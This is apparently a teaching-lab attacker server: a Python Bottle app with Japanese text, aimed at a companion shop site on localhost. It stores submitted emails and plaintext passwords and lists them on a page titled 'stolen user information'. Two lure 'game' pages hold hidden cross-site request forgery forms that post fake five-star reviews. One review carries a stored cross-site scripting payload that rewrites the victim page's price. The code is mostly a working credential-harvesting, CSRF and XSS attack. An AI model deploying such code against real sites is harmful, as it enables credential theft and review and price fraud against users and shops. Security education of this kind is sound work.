from bottle import route, run, template, request, redirect, response, abort
import sqlite3
from datetime import datetime


EVIL_DATABASE_FILE = 'evil.db'

@route('/users')
def list_users():
    conn = sqlite3.connect(EVIL_DATABASE_FILE)
    cur = conn.cursor()
    users = cur.execute('SELECT * FROM users;').fetchall()
    return template('''
<p>盗んだユーザー情報</p>
<table border="1">
  <tr><th>時刻</th><th>メールアドレス</th><th>パスワード</th></tr>
  %for user in users:
  <tr><td>{{ user[1] }}</td><td>{{ user[2] }}</td><td>{{ user[3] }}</td></tr>
  %end
</table>''', users=users)

@route('/users', method="post")
def add_user():
    email = request.forms.email
    password = request.forms.password
    conn = sqlite3.connect(EVIL_DATABASE_FILE)
    cur = conn.cursor()
    cur.execute('INSERT INTO users (datetime, email, password) VALUES (?, ?, ?)', (datetime.now(), email, password))
    conn.commit()
    redirect('http://localhost:8080/logout')

@route('/evil_game1')
def show_game1():
    return '''
<p>とっても楽しいゲームだよ！</p>
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
  <input type="submit" value="遊んでみる" />
</form>'''

@route('/evil_game2')
def show_game2():
    return '''
<p>いまだかつてないくらい楽しいゲームだよ！</p>
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="本当は★100を付けたいくらい最高の商品なのに、今だけ100円で売ってます！！<script>window.onload=function(){
      var td = document.querySelectorAll('tr td')[7];
      td.innerHTML = '<s>' + td.innerHTML + '</s><b>今だけ100円！！</b>';
  }</script>" />
  <input type="submit" value="遊んでみる" />
</form>'''

run(host='localhost', port=8081, debug=True, reloader=True)